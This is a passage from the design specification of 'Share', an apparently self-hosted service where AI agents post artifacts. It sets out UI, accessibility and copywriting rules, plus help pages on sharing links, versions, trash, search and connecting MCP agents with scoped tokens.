2. **A live link never renders without its expiry.** In a space too narrow for the full string, the row wraps or truncates the artifact's title instead; the expiry is the last thing to go, and if it cannot be shown, the state renders as an icon-only chip whose accessible name and tooltip carry the full absolute string.
3. A padlock glyph is appended when any live link has `hasPassword`.
4. Inside 48 hours of expiry the amber deepens to a warning treatment; the label and the data do not change.
5. The component is never interactive in a list row — clicking a row opens the artifact. In detail contexts it links to 11.12.

### 11.29.3 Time

- **Absolute is the truth; relative is the hint.** Any time that governs access — link expiry, artifact TTL, trash purge date, token expiry, session expiry — renders as `7 Sep 2026, 18:04 UTC` with the relative form in parentheses. Never relative alone.
- Times that are merely informational — "updated", "last used", "last viewed" — render relative (`2h ago`, `3 days ago`) with the absolute value in the `title` attribute and in the accessible name.
- Anything older than 7 days renders as an absolute date even in the informational case; "47 days ago" is not information anyone can use.
- Timezone follows `settings.timeZone`, defaulting to UTC, and the zone abbreviation is always printed. Dates are `D MMM YYYY`, times `HH:mm` 24-hour, seconds only in the audit log.

### 11.29.4 Tables and pagination

- Left-aligned text, right-aligned numbers, monospace for names, paths, hashes, and token prefixes.
- Row height 56px when a secondary line is present, 40px otherwise. Rows are `<a>`-wrapped so middle-click and modifier-click work.
- Sort is a header control only where the API supports the sort (§8.7); unsupported columns are not clickable rather than clickable-and-inert.
- **Pagination is cursor-based everywhere and page numbers appear nowhere.** Forward-only lists (artifacts, activity, trash) use a single **Load more** that appends. Bidirectional lists (audit) use **Newer** / **Older**, replacing the page. The footer states `50 of 218` where a total is cheaply known and `50 shown` where it is not. Offsets are unsupported by the API (§5.1.2) and no UI implies them.
- Empty and error states render inside the table body, preserving the header row, so the column structure does not jump.

### 11.29.5 Toasts

Bottom-left, stacked to a maximum of three, 5 seconds for a confirmation, 10 seconds when it carries an **Undo**, and indefinite for an error until dismissed. One line of text plus at most one action. Errors carry the `error.code` in small type so a user can quote it, and the `requestId` behind a copy control. Toasts never carry a password, a token, or a share URL — those live in their own one-time panels.

### 11.29.6 Destructive confirmation

Every destructive action confirms in a dialog that states three things in this order: **what happens**, **whether it can be undone and for how long**, and **what it does not do**.

| Action | Reversible | Confirmation |
| --- | --- | --- |
| Move to trash | Yes, 30 days | Standard dialog; names the restore date absolutely; states that live links and grants are revoked now and are not restored on restore |
| Delete permanently / Empty trash | **No** | Type-to-confirm: the artifact's name, or the phrase `empty trash` |
| Revoke a share link | **No** | Standard dialog, stating that recipient sessions die immediately and a new link means a new URL |
| Change or remove a link password | **No** (the old password is gone) | Standard dialog, stating that everyone currently viewing is signed out of the link |
| Revoke a token | **No** | Standard dialog naming the agent and stating its artifacts remain |
| Revoke a passkey | **No** | Standard dialog naming how many sessions die with it |
| Delete a version | Yes, trash window | Standard dialog |
| Disable a user | Reversible by re-enabling | Standard dialog listing what is revoked and what is retained |

The primary button in a destructive dialog carries the destructive treatment and a verb, never "OK". The cancel button is focused on open. Type-to-confirm dialogs disable the primary button until the string matches exactly, case-sensitively.

### 11.29.7 Keyboard shortcuts

| Key | Action |
| --- | --- |
| `⌘K` / `Ctrl-K` | Command palette (11.16) |
| `/` | Focus search, when no input is focused |
| `g` then `a` / `s` / `t` / `k` | Go to artifacts / shared / trash / tokens |
| `u` | Upload (11.17) |
| `Esc` | Close dialog, palette, or viewer; never navigates back a level from a plain screen |
| `↑` `↓` | Move selection in tables and the palette |
| `⏎` | Open the selected row |
| `⌘⏎` | Open the selected row's artifact URL in a new tab |
| `?` | Shortcut reference sheet |

No single-letter destructive shortcut exists. Deleting always takes a menu and a confirmation.

### 11.29.8 Responsive breakpoints

| Width | Changes |
| --- | --- |
| ≥ 1280px | Full layout; 11.7's right rail is present; 11.11 shows both panes side by side |
| 1100–1280px | 11.7's rail narrows to 280px |
| 900–1100px | 11.7's rail collapses beneath the main column, **sharing card first**; 11.11 stacks with compare first |
| 600–900px | Sidebar becomes an off-canvas drawer; tables drop the size and version columns; the sharing state stays |
| < 600px | Tables become stacked cards: name and title on line one, the sharing state on line two, updated and size on line three. Search collapses to an icon. Dialogs go full-screen with a sticky footer holding the primary action |

The sharing state is present at every width. It is the last thing any breakpoint is allowed to remove, and no breakpoint removes it.

### 11.29.9 Empty states

One glyph, one heading naming what is absent, one sentence of explanation, and at most one action. Two rules: an empty state caused by filters always offers **Clear filters** and keeps the filter bar; an empty state the user cannot act on (11.14 with nothing shared) offers no action rather than a decorative one.

### 11.29.10 Error states

- **Field errors** — inline beneath the field, from `error.detail.fields[].path`.
- **Region errors** — a bordered block replacing just the failed region: one line from `error.message`, the `error.code` in small type, **Retry**, and a copy control for `requestId`. Sibling regions stay live.
- **Route errors** — a full-page block inside the shell for 404 and 403 on dashboard routes. The 404 variant is worded identically whether the artifact does not exist or is not the caller's (P1).
- **Connection lost** — a top strip when three consecutive requests fail at the transport layer, with automatic retry and a manual **Retry now**. Distinguished from `503`, which routes to the maintenance message.
- **Never** invent a friendly message over an unknown code: show `error.message` from the API, which §12.8 guarantees is one sentence, safe to print, and free of paths and credentials.

### 11.29.11 Skeleton loading

Skeletons, not spinners, wherever the shape of the result is known: table rows, cards, the artifact header, both panes of 11.11. They match the real element's dimensions so nothing reflows on arrival. Spinners are reserved for in-place actions with an unknown duration — a button mid-request, an upload commit. Content that arrives in under 200ms renders without a skeleton at all, to avoid a flash. The artifact viewer (11.9) shows a neutral panel rather than a skeleton: the artifact's own load is the real feedback.

---

## 11.30 — Accessibility

Baseline: WCAG 2.2 AA. These are the requirements this product's specific shapes create.

### 11.30.1 Focus management in dialogs

Every dialog — 11.13 above all — is a `<dialog>` element with `aria-modal="true"` and `aria-labelledby` pointing at its heading.

- On open, focus moves to the dialog's heading (not the first field), so a screen reader announces what the dialog is before what it wants.
- Focus is trapped for the dialog's lifetime and returns to the invoking control on close, including when the close came from the browser's back button.
- `Esc` closes 11.13's Configure and Confirm states. **`Esc` does not close 11.13's Created state or 11.18's created-token state** — a one-time secret must not be dismissible by a reflex keystroke. In those states the only exit is the **Done** button, which is the initially focused element, and the dialog's `aria-describedby` points at the "shown once" sentence.
- Destructive dialogs open with **Cancel** focused.
- Type-to-confirm inputs are `aria-describedby` the exact string required.

### 11.30.2 A keyboard path for every primary action

No action in the product requires a pointer. Specifically: create a share link (`g a`, `↓`, `⏎`, then the tab bar, then the button), copy a generated password (the copy control is a real button in the tab order immediately after the password text), restore a version, restore from trash, revoke a link or token, set an entry file, and approve a device code. Hover-revealed controls — row checkboxes, row menus — are focusable and become visible on focus, not only on hover.

### 11.30.3 ARIA for the artifact table and the file tree

- **Artifact tables** use real `<table>` markup with `<th scope="col">`. Sortable headers carry `aria-sort`. Each row's accessible name is composed as: name, title if present, **sharing state including the absolute expiry**, updated time absolute, size. The sharing state is never conveyed by colour or glyph alone — the visible label carries the word, and the icon-only variant (11.29.2 rule 2) has an `aria-label` with the full string.
- **The file tree** (11.8) is `role="tree"` with `role="treeitem"`, `aria-expanded`, `aria-level`, and `aria-setsize`/`aria-posinset` on each node. Arrow keys navigate, `←`/`→` collapse and expand, `⏎` opens. The visual indentation is mirrored by `aria-level` rather than inferred from it.
- Bulk-selection checkboxes are grouped under an `aria-label` naming the selection count, and the bulk-action bar is `role="region"` with `aria-live="polite"` so the count is announced as it changes.

### 11.30.4 Contrast and colour

- Text meets 4.5:1; large text and UI boundaries meet 3:1; focus rings meet 3:1 against both the element and its background.
- The three sharing states are distinguishable without colour: hollow circle, filled circle, filled diamond, each with a text label. The amber "expiring soon" treatment adds a warning glyph rather than only deepening a hue.
- Destructive actions are identified by verb and confirmation flow, never by red alone.
- Both light and dark themes are specified in §13; every rule here holds in both.

### 11.30.5 Reduced motion

Under `prefers-reduced-motion: reduce`: skeleton shimmer becomes a static tint, dialogs and drawers appear without transform or fade, toasts appear and disappear without sliding, and progress bars keep their determinate fill (real information) while indeterminate spinners become a static label. No essential state is conveyed by motion anywhere.

### 11.30.6 Screen-reader announcements for async results

A single polite `aria-live` region for confirmations and a single assertive one for errors, both at the document level.

| Event | Politeness | Announced |
| --- | --- | --- |
| Toast confirmation | polite | The toast text |
| Toast error | assertive | The message plus the error code |
| List loaded / **Load more** | polite | "50 more artifacts loaded. 100 of 218." |
| Filter or search change | polite | The result count, debounced to fire once per settled query |
| Upload progress | polite | Every 25%, not per file, and not per byte |
| Share link created | assertive | "Share link created. Expires 7 September 2026 at 18:04 UTC. The password is shown once on screen." |
| Copy to clipboard | polite | "Link copied", "Password copied" |
| Optimistic action reverted | assertive | What was undone and why |

Announcements spell out the absolute expiry in full words rather than the abbreviated visual form, because an abbreviated date read aloud is worse than a long one.

### 11.30.7 R1 works without JavaScript

This is a hard requirement, tested, not a preference (§7.4).

- R1 is a complete HTML document containing a `<form method="post">` whose `action` is an absolute path. No script is required to submit it, and no script is present on the page.
- The password input has `autocomplete="current-password"` and `autofocus`, so a password manager can fill it and a keyboard user lands in it.
- The error state is a re-rendered document at 401, not a client-side update, so it is announced by every assistive technology as a new page.
- The same absence of JavaScript applies to R2–R7. R6 in particular must render from a static file with the API, database, and Redis all unavailable.
- Every one of these pages is legible at 320px wide, at 200% zoom, and with author styles disabled — which follows from their being a heading, a paragraph, and at most a form.

---

# Part 12 — All Product Copy

This part is the authority on wording. Where an earlier part sketches a string in passing and
this part gives a different one, **this part wins** — it is the finished text, and the earlier
sketch was shorthand. Screen numbers are from `inventory.md`.

Substitutions written as `{name}`, `{expiry}`, `{handle}` are filled at render time. Every
absolute time renders per §11.29.3: `7 Sep 2026, 18:04 UTC`, relative hint in parentheses.

---

## 12.1 Voice and tone

Share is a tool for keeping and handing out finished work, some of it about other people's
business. It should read the way a competent colleague talks: plainly, without decoration, and
without pretending anything is more or less serious than it is.

### The rules

**1. Say what happened, then what to do.** An error that only names a condition is half an
error.

> Good: "That name is already taken by an artifact in your trash. Restore it, rename it, or
> empty the trash."
> Bad: "Conflict. Name unavailable."

**2. No exclamation marks. Anywhere.** Not in success toasts, not in emails, not in the empty
states. There is nothing in this product worth an exclamation mark.

> Good: "Share link created."
> Bad: "Share link created!"

**3. Never apologise for a working system, never joke about a broken one.** No "Oops", no
"Something went wrong", no "Uh oh", no sad-face glyphs.

> Good: "The server did not respond. Retry, or check the instance status."
> Bad: "Oops! Something went wrong on our end."

**4. Be specific about consequence, especially about access.** Sharing copy names who gets in,
until when, and what protects it. Never "anyone can see this" without an end date attached.

> Good: "Anyone with the link can view this until 7 Sep 2026, 18:04 UTC (in 14 days). A password
> is required."
> Bad: "This artifact is shared."

**5. Absolute times govern; relative times hint.** Anything that controls access is written as
a full timestamp. "Expires soon" is never the whole sentence.

> Good: "Expires 7 Sep 2026, 18:04 UTC (in 2 days)."
> Bad: "Expires in 2 days."

**6. Do not soften a permanent thing.** If something cannot be undone, the copy says so in the
same breath as the verb.

> Good: "Revoking is immediate and cannot be undone. A new link is a new URL."
> Bad: "Are you sure you want to revoke this link?"

**7. Never claim knowledge the system does not have.** Share does not read files, so no copy may
imply it did. No "we noticed", no "based on your content", no generated summaries or titles.

> Good: "Search covers names, titles, descriptions, and tags."
> Bad: "We couldn't find anything matching that in your documents."

**8. Sentence case everywhere.** Headings, buttons, table headers, email subjects. Proper nouns
and the product name keep their capitals. Column headers in dense tables may be small caps
visually, but the string is sentence case.

**9. Buttons are verbs, and they name the specific act.** Never "OK", never "Submit", never
"Yes".

> Good: "Create link", "Move to trash", "Delete permanently", "Extend"
> Bad: "OK", "Confirm", "Proceed"

**10. Second person for the reader, no first-person plural for the system.** "You", "your
artifacts". The system is "Share" or it is nothing — not "we". The one place "us" appears is
the password panel's "including us", which is an honest technical statement about what is
stored, and it is deliberate.

**11. American spelling.** Authorize, recognize, canceled, color, license (noun and verb),
behavior. Applies to copy only; API field names and RFC terms are unchanged.

**12. Number and unit style.** Digits for all counts ("3 files", "1 link"). Sizes as `110 KB`,
`2.4 MB`, `18 GB`, one decimal place above 1 MB, none below. Percentages as `80%`. Durations
spelled out in prose ("14 days"), abbreviated in code and flags (`14d`).

**13. Length.** One sentence for a toast. Two for an error. Three for a destructive
confirmation, in the order: what happens, whether it can be undone, what it does not do.

**14. No progress-blocking cheerfulness.** Empty states describe the absence and offer at most
one action. They do not congratulate, encourage, or promise.

> Good: "Nothing in the trash. Deleted artifacts stay here for 30 days."
> Bad: "All clean! Your trash is empty."

---

## 12.2 Canonical terminology

### 12.2.1 Use this, never that

| Use | Never | Why |
| --- | --- | --- |
| **artifact** | file, site, page, project, upload, asset, doc | An artifact is the unit of ownership, addressing, sharing, versioning, and deletion. "File" means one blob inside one. |
| **file** | asset, resource | Only ever a single blob inside an artifact. |
| **bundle** | site, folder, app, deployment | A multi-file artifact. Share does not host sites. |
| **post** | publish, deploy, push live, upload to the web | "Publish" implies the internet; posting does not widen access at all. |
| **share link** | public link, published link, shareable URL, magic link | It is a capability, not a publication. |
| **private** | unlisted, hidden, secret, draft | Private means signed-in only. "Unlisted" implies public-but-obscure, which is exactly what a share link is and private is not. |
| **grant** / **shared with** | invite to artifact, collaborator, member, permission | Grants are per-artifact reads for one named user. |
| **recipient** | viewer account, guest user, external user | A recipient never has an account. |
| **trash** | archive, bin (UK), deleted items, recycle bin | "Archive" implies keeping; trash implies a clock, and there is one. |
| **passkey** | password, credential (in user-facing copy), 2FA, MFA | There is no password on an account. Ever. |
| **share-link password** | link password is fine; never "your password" | It protects one link, not an identity. |
| **token** / **API token** | key, API key, secret, credential | Matches `shr_` and the CLI. |
| **agent** | bot, integration, app, client | The thing holding a token. |
| **space** | workspace, team, org, account area | One person's namespace. There are no teams. |
| **version** | revision, snapshot, backup, history entry | |
| **entry file** | index, homepage, default document, root page | |
| **staleness** / **not opened in N days** | inactive, abandoned, unused, orphaned | Nothing is deleted for being stale, so no word implying doom. |
| **expires** | times out, dies, is revoked (unless it was) | Expiry and revocation are different events. |
| **revoke** | delete, remove, cancel (for links, tokens, grants) | |
| **sign in** / **sign out** | log in, login (verb), log out | `login` remains correct as a noun in `share login`. |
| **instance** | server, deployment, environment, cloud | |
| **operator** | admin, owner (when talking about the machine) | The owner owns artifacts; the operator runs the box. |

Two further bans: never write **"public"** as a state of an artifact — the states are private,
link, and link plus password. And never write **"secure"** or **"safe"** as a bare adjective
about anything the product does; say what protects it instead.

### 12.2.2 Tooltip definitions

Exactly one sentence each. These are the strings behind every `?` and every glossary hover in
the dashboard, and they are identical everywhere they appear.

| Term | Tooltip |
| --- | --- |
| **Artifact** | One finished thing you posted — a single file or a bundle of files that belong together — with its own name, URL, versions, and sharing. |
| **Bundle** | An artifact made of more than one file, such as an HTML page with its styles and images, served as a unit so relative links keep working. |
| **Name** | The artifact's address inside your space, like `postcal` or `q3/market-report`, chosen by you or your agent and stable until you rename it. |
| **Space** | Your own namespace, where every artifact you own lives; nothing outside it can write into it and nothing inside it is listed to anyone else. |
| **Version** | An immutable snapshot of an artifact's files, created every time the artifact is posted again, with earlier ones kept and restorable. |
| **Share link** | A URL at `/s/…` that lets anyone holding it view exactly one artifact until it expires, optionally behind a password. |
| **Grant** | Read access to one artifact for one named user on this instance, who reaches it signed in as themselves with no link to forward. |
| **Recipient** | Someone viewing an artifact through a share link, with no account, who can see that one artifact and nothing else. |
| **Token** | An agent's credential, starting `shr_`, with its own name, its own scopes, and its own revoke button. |
| **Passkey** | The credential you sign in with, held by your device or password manager instead of typed, which is why this account has no password. |
| **Trash** | Where deleted artifacts wait 30 days before they are removed for good, still counting against your storage the whole time. |
| **TTL** | An optional expiry on the artifact itself, after which it moves to the trash automatically and stays recoverable for another 30 days. |
| **Staleness** | Artifacts you have not opened in the last 90 days, listed so you can decide what to delete; nothing here is ever deleted for you. |

---

## 12.3 First-run checklist

Shown on 11.6 in place of the artifact table when the space is empty. Card heading and
intro, then the items in order. Item 4 renders for the root user only. Item 6 is present for
every user.

**Heading:** Set up Share
**Intro:** Five things, once. The first two get an agent posting to this instance; the rest
make sure you can still get in and still know what is reachable.

| # | Title | Description | CTA |
| --- | --- | --- | --- |
| 1 | Connect an agent | Point Claude Code, Cursor, Codex, or any MCP host at this instance with one configuration block and a token. | Create a token |
| 2 | Post your first artifact | Have your agent call `share_post`, or run `share post ./folder`. It stays private until you say otherwise. | See the setup page |
| 3 | Add a second passkey | One passkey is one device away from a recovery process. A second one on another device is what makes losing the first uneventful. | Add a passkey |
| 4 | Save your recovery code | Twenty-four characters, shown once, good for one sign-in if every passkey is gone. Put it where you keep other things you cannot regenerate. | Show my recovery code |
| 5 | Check what reaches your inbox | Share emails you every time something of yours becomes reachable without a sign-in, including when an agent does it. Confirm that is still on. | Review notifications |
| 6 | *(root only)* Invite someone | Share has no sign-up. People get accounts because you create them, and each gets their own space at `share.c52.com/~handle`. | Invite someone |

**Per-item states**

| State | String |
| --- | --- |
| Done | Done |
| Dismissed | Skipped · Undo |
| Dismiss control | Do this later |
| Item 2 while polling | Waiting for your first post. This updates on its own. |
| Card footer | You can leave this at any time — it disappears once every item is done or skipped. |

**Below the card**, the plain empty state:

- Heading: Nothing here yet
- Body: Artifacts your agents post appear here, newest first.
- Secondary action: Upload from your browser

---

## 12.4 In-app documentation

Rendered at `/~/help` from bundled Markdown (11.27). `{host}` is `share.c52.com`, `{handle}` is
the reader's own handle; nothing else is substituted and nothing is fetched.

---

### 12.4.1 Quickstart

Share is where your agents put finished work so you can find it later and hand it to people.
Two ways in: connect an agent, or upload from this browser.

**The agent path.** Share speaks MCP at `https://share.c52.com/mcp`. There is nothing to
install. Create a token on the API tokens screen, then paste this into your MCP host's
configuration:

```json
{
  "mcpServers": {
    "share": {
      "type": "http",
      "url": "https://share.c52.com/mcp",
      "headers": { "Authorization": "Bearer shr_YOUR_TOKEN" }
    }
  }
}
```

Restart the host. Your agent now has `share_post`, `share_list`, `share_get`, `share_versions`,
and the rest. Ask it for something finished — "make me a Q4 posting calendar as an HTML page and
post it to Share as `postcal`" — and it will come back with a URL:

```
https://share.c52.com/postcal
```

That URL is **private**. Open it in this browser, signed in, and it works. Open it in a private
window and it is a 404, indistinguishable from a name that never existed. Posting never widens
access; that is a separate, deliberate act.

Post it again next week and the URL does not change. You get version 2, and version 1 stays
where it is.

**The human path.** No agent, or something that arrived by email: use **Upload** in the top bar.
Drop a file or a whole folder — the folder's relative paths are preserved, so a page with a
`style.css` and an `img/` directory keeps working. Give it a name, which becomes its address, and
a title if you want one shown. Nothing is ever filled in from the contents of your files.

**Handing something to a person.** Open the artifact, go to **Sharing**, and create a share
link. You choose how long it lives — every link expires, and 14 days is the default — and
whether it needs a password. You get the URL and, if you asked for one, a generated password,
shown once. Send them separately if the contents deserve it.

**When you want it back.** Search from `⌘K` covers names, titles, descriptions, and tags. Deleted
artifacts sit in the trash for 30 days. Overwritten ones keep their old versions. Almost nothing
here is one keystroke from gone.

---

### 12.4.2 Posting artifacts

**What an artifact is.** One finished thing, at one address, with one history. It might be a
single PDF, or an HTML page with eleven supporting files. Either way it is one artifact: one
name, one URL, one set of versions, one sharing state, one entry in the trash if you delete it.
The unit is deliberate — it is what makes "send the client the report" a single act rather than
an attachment-management exercise.

**Naming.** The name is the address. `postcal` lives at `share.c52.com/postcal`. Slashes work,
so `q3/market-report` is a legal name and gives you a shallow hierarchy without folders being a
real thing. Names are lowercase (a submitted `PostCal` is lowercased for you), start with a
letter or digit, and may contain `.`, `_`, `-`, and `/`. Up to 200 characters and 8 segments.

If your agent does not supply a name, Share generates one like `civil-marmot-a4f2`. Those are
fine for scratch output. Anything you intend to return to should be named on purpose, because
the name is what you will search for.

**Entry points.** For a bundle, one file has to answer at the artifact root. Share picks in this
order: the `entryPath` you supplied, then `/index.html`, then the only HTML file if there is
exactly one, then the only file if there is exactly one. If none of those apply, the artifact
root shows a plain file listing instead, and you get a `no_entry_point` warning. You can set or
change the entry file at any time on the Files tab — it takes effect immediately, without
posting again.

**Multi-file bundles.** Relative links inside a bundle resolve exactly as they would on a normal
web server: `./style.css` from `/index.html` works, `img/chart.png` works, a directory with its
own `index.html` works. What does not exist is a fallback route — a missing `.json` returns 404
rather than your index page, because Share serves artifacts, not applications. If you include a
`404.html`, it is served for missing paths inside that artifact.

**Overwriting in place.** Post to a name that already exists and you get a new version of it, at
the same URL. Nothing about the artifact resets: title, description, tags, TTL, pinned state,
share links, and grants all survive. Only the files change. The old version stays complete and
restorable, and unchanged files are not re-uploaded or re-stored — identical bytes are kept once
instance-wide, so twenty versions of a calendar that changes a few lines a week cost almost
nothing.

Two things overwriting does affect. First, anyone holding a live share link sees the new version
immediately — see "What happens when an agent overwrites something you shared". Second, the
artifact's `updatedAt` moves, so it returns to the top of your list, which is usually what you
want and occasionally a surprise.

---

### 12.4.3 Privacy and sharing

This is the page to read if you read only one.

**Three levels, and nothing between them.**

| Level | Who gets in | What they need |
| --- | --- | --- |
| **Private** | You, and any user you granted | A passkey and a signed-in session |
| **Link** | Anyone holding the link | The URL, which contains 128 bits of randomness |
| **Link + password** | Anyone holding the link and the password | Both, given separately if you have any sense |

Private is the default and where most things stay. An artifact with no share link and no grant
returns exactly the same 404 to a stranger as a name that never existed — same body, same
headers, no timing tell. There is no fourth level, no "public" flag, and no way for an artifact
to be found by a search engine: every response carries `noindex, nofollow` and `robots.txt`
denies everything, with no per-artifact override.

There is also no toggle. A share link is an object you create, label, list, and revoke, and
creating one is a multi-step flow with a confirmation step. That friction is the design. A
switch you can flip in passing is a switch you can flip by accident.

**Why every link expires.** There is no permanent share link, no setting to make one, and no way
to ask the API for one. Links do not leak by being guessed — at 128 bits, guessing is not a
thing that happens. They leak by being forwarded, saved into a folder, pasted into a ticket,
screenshotted, and archived. A link that stopped working in February is a non-event when the
archive holding it surfaces three years later. The default is 14 days, the ceiling is 180, and
extending is one click from the email you get 24 hours before it dies.

**What a recipient can learn.** Deliberately, almost nothing:

- The URL contains no owner handle, no artifact name, and no artifact ID.
- The password gate names nothing at all — not the artifact, not who sent it, not the file type,
  not how long the link has left.
- Assets load under `/s/{token}/…`, so someone viewing a bundle never sees its real path or the
  name of your space.
- Expired, revoked, burned through its view limit, and trashed all produce the same page: "This
  link is no longer active." A recipient cannot tell which happened.
- What you can see about them is a count and a date. Views are recorded as a salted daily hash
  that cannot be recomputed the next day, so "4 views on Tuesday via Fairfield listing team" is
  the finest resolution that exists, for you and for anyone with database access.

**Why your agents cannot create share links.** An agent token holds `artifacts:read` and
`artifacts:write` by default, and not `share:create`. It can post, overwrite, tag, and trash its
own owner's work. It cannot make any of it reachable from the internet. Ask an agent to "share
this with my client" and it fails with `insufficient_scope`, naming the scope, and the right
answer is for it to hand you a link to the dashboard so you can decide.

This is the single most important line in the product. Putting something in front of a person
outside the system is a human decision, and an agent that can post but cannot publish has a
worst case of a messy space rather than a client's numbers on the open internet.

You can grant `share:create` to a token deliberately, on the tokens screen, with a warning
attached, and the grant is audited. If you do, that token's link creations show its name as the
creator everywhere they appear, and you are emailed the first time it ever creates one.

**Your own sessions are not scoped.** The `share:create` scope constrains tokens, not people.
Signed in, you can always share anything of your own.

---

### 12.4.4 Share links and grants

Two ways to let someone see one artifact. They are not variations on a theme.

**A share link** is a bearer capability. Anyone holding the URL is in, until it expires. Use it
for people who do not have accounts here: clients, counterparties, someone's phone. Its
strengths and its weakness are the same fact — nothing about the recipient is checked, so
nothing about the recipient needs arranging.

**A grant** gives one named user on this instance read access to one artifact. They reach it at
its canonical URL signed in as themselves. There is no bearer token to forward, no password to
mishandle, and no expiry to manage. They can view, download, and save a copy. They cannot edit,
rename, delete, share it onward, or see anything else in your space. Use it for anyone who has
an account here.

**Passwords on links.** Choose *generate a password for me* unless you have a reason not to. The
generated form is `{adjective}-{noun}-{digits}` — `civil-marmot-71` — designed to survive being
read aloud on a phone call. It is shown once, at creation, and no endpoint will ever return it
again; the server keeps only an argon2id hash. If you lose it, create a new link. Your own
passwords need 8 characters and nothing else: no composition rules, no strength meter, because
a meter would imply rules the server does not enforce.

Attempts against a link's password are limited to 10 per IP per hour and 50 per link per hour,
and you are emailed the first time a link's ceiling is hit.

**Revoking.** Immediate and not reversible. Every recipient session on that link dies on the
next request, the cache is purged in the same call, and anyone holding the URL gets "This link
is no longer active." There is no un-revoke — a new link is a new URL. Revoking a grant takes
effect on that user's next request.

For the morning something looks wrong, the security overview has **Revoke all share links**,
which is the dashboard equivalent of `sharectl panic`: every live link on your account, gone,
with a count shown before you confirm.

**Extending.** Extension adds to the current expiry rather than restarting from now, so
extending can never accidentally shorten a link. The dialog shows you the resulting absolute
date before you confirm.

**Reposting an artifact that has a live link.** The link keeps working and now shows the new
version. This is deliberate and it has a sharp edge — see the dedicated page.

**Copying the URL later.** Share stores a hash of each link token and the first few characters,
never the token itself. So the **Copy** control works for a link created in this browser session
and cannot work for one created last week: the full URL is genuinely unrecoverable, including by
the operator. The card says so and offers to create a new link instead of showing you a dead
button.

---

### 12.4.5 Versions, trash, and getting things back

Agents have full control over their own space. These are the two mechanisms that make that
acceptable.

**Versions.** Every post to an existing name creates a new version, numbered from 1. The
previous ones stay complete and viewable. On the Versions tab you get, per version: when, by
which agent or person, how many files, total size, the version note if one was supplied, and a
count of what changed — added, modified, removed.

That count compares *manifests*, not contents. Share does not read your files, so there is no
line-level diff anywhere in this product, and there never will be. "3 files, 1 modified" is the
finest answer available.

**Restoring a version creates a new one.** Restoring v1 while v3 is live gives you v4 with v1's
files. History stays append-only, so "what was live in March" always has an answer. A restore
carries the files and the entry file. It leaves everything else exactly as it is now: name,
title, description, tags, TTL, pinned state, share links, and grants. Rolling back content must
never quietly change who can see something.

**Retention.** By default Share keeps the last 20 versions and anything from the last 365 days,
never fewer than 3, and never prunes a pinned version or the live one. Pin any version you want
kept regardless. Pruning happens on the nightly job, so lowering the setting shows you what it
would remove and then removes it overnight, not instantly.

**Trash.** Deleting an artifact moves it to the trash for 30 days. While it is there it returns
404 at its URL to everyone including anyone holding a link, it is absent from listings and
search, it still holds its name, and it still counts against your storage. Restore brings it
back with every version intact.

**One asymmetry to know.** Trashing revokes every share link and grant on the artifact
immediately. Restoring does **not** bring them back. Undoing a deletion should not silently
re-open access, so anyone who had a link stays locked out until you make a new one. Every
confirmation dialog that trashes something says this before you press the button.

**Permanent deletion** skips the trash and cannot be undone: every version goes, and every file
nothing else references is removed from disk on the next collection pass. It needs the
`artifacts:delete` scope over the API, which agent tokens do not get by default. That is why the
worst a runaway agent can do is fill your trash.

**Names and the trash.** A trashed artifact keeps its name, so posting to that name returns
`name_taken` until you restore it, rename it, or empty the trash. If the name has since been
taken by something new, restoring asks you to rename first.

---

### 12.4.6 Search

`⌘K` from anywhere, `/` when nothing is focused, or the search field in the top bar. Results
show the same sharing-state indicator as every other list, because a private artifact and one
with a live link are different things and you should not have to open either to tell.

**What search covers:** names, titles, descriptions, and tags. Matching is trigram-based, so
partial words and typos work — `postcl` finds `postcal`, `calend` finds "Q4 posting calendar".
Ranking goes exact name, then name prefix, then similarity on name, then title, then
description. Tags match exactly and boost.

**Filters**, in the palette and in the URL of the full results page: `q`, `tag` (repeatable, all
must match), `kind` (`bundle`, `page`, `document`, `image`, `video`, `file`), `token` (which
agent posted it), `hasLink`, `createdAfter` / `createdBefore`, `updatedAfter` / `updatedBefore`,
and `sort` (updated, created, name, size, views). Filter state lives in the query string, so a
filtered view is a URL you can bookmark or send to yourself.

**What search cannot do: find a phrase inside your files.** Not a sentence in an HTML report,
not a number in a PDF, not a word spoken in a video. This is not a missing feature. Share never
reads the contents of anything you post — not to index, not to summarize, not to generate a
title, not to make a thumbnail. That guarantee is the reason this instance exists rather than a
commercial one, and full-text search is what it costs.

**So name and tag things.** The practical consequences:

- Give artifacts real names. `q3/market-report` is findable; `civil-marmot-a4f2` is not.
- Set a title when the name is terse. Titles are searched.
- Use the description field for the sentence you would have searched for. It is searched too,
  and nothing else in the product reads it.
- Tag by project, client, and source. `--tag fairfield --tag listing` costs one flag and turns a
  guess into a filter.
- Tell your agents to do all of the above. The `share_post` tool description says exactly this,
  for exactly this reason.

Search is scoped to your own artifacts plus anything granted to you. There is no instance-wide
search, including for the root user, because a search that crosses spaces is a listing of
someone else's work.

---

### 12.4.7 Connecting agents

Share speaks MCP over streamable HTTP at `https://share.c52.com/mcp`, authenticated with the
same `shr_` token the HTTP API and the CLI use. There is nothing to install for the MCP path.

Create a token first: **API tokens → New token**. Name it `agent@machine` — `grokbot@hosta`,
`claude-code@laptop` — because that name appears on every artifact it posts and in every audit
row, and "which of these three is the Mac Mini" needs an answer before you revoke one.

**Claude Code** — `~/.claude/settings.json`, or `.mcp.json` in a project:

```json
{
  "mcpServers": {
    "share": {
      "type": "http",
      "url": "https://share.c52.com/mcp",
      "headers": { "Authorization": "Bearer shr_YOUR_TOKEN" }
    }
  }
}
```

**Cursor** — `~/.cursor/mcp.json`, or `.cursor/mcp.json` in a project:

```json
{
  "mcpServers": {
    "share": {
      "url": "https://share.c52.com/mcp",
      "headers": { "Authorization": "Bearer shr_YOUR_TOKEN" }
    }
  }
}
```

**Codex** — `~/.codex/config.toml`:

```toml
[mcp_servers.share]
url = "https://share.c52.com/mcp"

[mcp_servers.share.headers]
Authorization = "Bearer shr_YOUR_TOKEN"
```

**Any other MCP host** — the endpoint descriptor is at
`https://share.c52.com/.well-known/mcp`. If the host speaks only stdio, install the CLI and run
`share mcp`, which is a thin proxy to the same endpoint rather than a second implementation:

```json
{
  "mcpServers": {
    "share": { "command": "share", "args": ["mcp"] }
  }
}
```

**Letting an agent get its own token.** An agent with shell access can run the device-code flow
instead of being handed a secret:

```
$ share login
Open https://share.c52.com/~/authorize and enter QRTZ-8H4M
Waiting for approval…
Signed in. Token saved to ~/.share/credentials (mode 0600).
Scopes: artifacts:read artifacts:write  (cannot create share links)
```

You approve it in the dashboard, signed in with your passkey, seeing the agent's declared name,
the source address, and the scopes it will get, before anything is issued. The token never
